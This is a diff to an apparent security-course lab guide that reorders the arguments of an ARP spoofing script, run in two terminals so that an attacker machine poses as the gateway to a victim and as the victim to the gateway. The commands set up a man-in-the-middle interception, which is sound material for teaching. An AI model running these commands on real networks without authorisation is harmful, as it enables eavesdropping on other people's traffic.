@@ -295,10 +295,10 @@ Open two terminals on the attacker machine and run both commands simultaneously:
 
 ```bash
 # Terminal 1: Tell the victim that you are the gateway
-sudo python3 labs/week-02/scripts/arpspoof.py <victim-ip> <gateway-ip> <interface>
+sudo python3 labs/week-02/scripts/arpspoof.py <interface> <victim-ip> <gateway-ip>
 
 # Terminal 2: Tell the gateway that you are the victim
-sudo python3 labs/week-02/scripts/arpspoof.py <gateway-ip> <victim-ip> <interface>
+sudo python3 labs/week-02/scripts/arpspoof.py <interface> <gateway-ip> <victim-ip>
 ```
 
 **Example** (iPhone hotspot, Wi-Fi interface `en0`, victim at `172.20.10.5`, gateway at `172.20.10.1`):
